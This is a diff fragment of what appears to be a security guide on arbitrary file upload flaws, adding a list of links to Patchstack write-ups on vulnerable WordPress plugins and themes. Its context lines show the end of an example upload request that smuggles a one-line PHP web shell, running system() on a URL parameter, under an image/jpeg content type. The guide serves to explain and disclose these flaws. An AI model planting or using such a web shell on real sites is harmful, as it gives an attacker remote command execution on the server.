@@ -179,3 +179,16 @@ Content-Type: image/jpeg
 <?php echo system($_GET["id"]); ?>
 ------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
 ```
+
+## Article References
+
+
+Below are some of the findings related to Arbitrary File Upload:
+
+- [AI Engine Plugin Affected by Critical Vulnerability](https://patchstack.com/articles/ai-engine-plugin-affected-by-critical-vulnerability/)
+- [Multiple Vulnerabilities Patched in Themify Ultra Theme](https://patchstack.com/articles/multiple-vulnerabilities-patched-in-themify-ultra-theme/)
+- [Critical Vulnerability in Elementor Affecting 5+ Million Websites](https://patchstack.com/articles/critical-vulnerability-in-elementor-affecting-5-million-websites/)
+- [Pre-Auth Arbitrary File Upload in User Submitted Posts Plugin](https://patchstack.com/articles/pre-auth-arbitrary-file-upload-in-user-submitted-posts-plugin/)
+- [Critical Arbitrary File Upload Patched in Forminator Plugin](https://patchstack.com/articles/critical-arbitrary-file-upload-patched-in-forminator-plugin/)
+- [Multiple High and Critical Vulnerabilities in Avada Theme and Plugin](https://patchstack.com/articles/multiple-high-and-critical-vulnerabilities-in-avada-theme-and-plugin/)
+- [Critical Vulnerabilities Patched in Jupiter X Core Plugin](https://patchstack.com/articles/critical-vulnerabilities-patched-in-jupiter-x-core-plugin/#unauthenticated-arbitrary-file-upload)
